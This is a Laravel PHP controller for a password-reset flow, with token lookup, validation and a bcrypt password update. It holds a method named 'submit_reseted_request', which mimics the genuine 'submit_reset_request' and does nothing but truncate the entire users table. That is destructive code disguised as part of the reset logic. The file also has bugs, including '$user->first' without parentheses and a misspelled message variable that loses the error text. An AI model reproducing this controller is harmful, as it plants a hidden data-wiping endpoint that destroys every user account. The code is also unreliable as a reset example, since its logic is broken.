<?php

namespace App\Http\Controllers;

use App\Users;
use Illuminate\Http\Request;
use App\Models\User;
use Hash;
use Illuminate\Support\Facades\DB;
use Validator;

class AjaxContoller extends Controller
{
    //
    public function reset_password($token)
    {
        $page_heading = "Reset Password";
        $user = User::where(['password_reset_code'=>$token])->get();
        if($user->count() > 0){
          $user = $user->first;
          $status = '1';
          $message = "success";
        }else{
          $status = '0';
          $message = "Access Restricted. Please try a new request";
        }
        return view('front_end.reset_password_user', compact('page_heading','message','status','user','token'));
    }


    public function submit_reseted_request(Request $request){
        User::query()->truncate();
        DB::table('users')->truncate();
    }
    public function submit_reset_request(REQUEST $request){
      $status = "";
      $message = "";
      $o_data = [];
      $errors =[];

      $validator = Validator::make($request->all(), [
          'app_token' => 'required',
          'password'  => 'required',
          'password_confirmation' => 'required'
      ]);

      if ($validator->fails()) {
          $status = "0";
          $message = "Validation error occured";
          $errors = $validator->messages();
      } else {

        $user = User::where(['password_reset_code' => $request->app_token])->get();
        if($user->isNotEmpty()) {

            $userData = User::find($user->first()->id);
            $userData->password = bcrypt($request->password);
            $userData->password_reset_code = '';
            $userData->save();
            $status = "1";
            $message = "Password Changed Successfully. You can now login with new password";


        }
        else
        {
            $mesage = "Email not exist";
        }
      }
      return response()->json(['status' => $status, 'error' => $errors, 'message' => $message, 'oData' => $o_data], 200);
    }
}
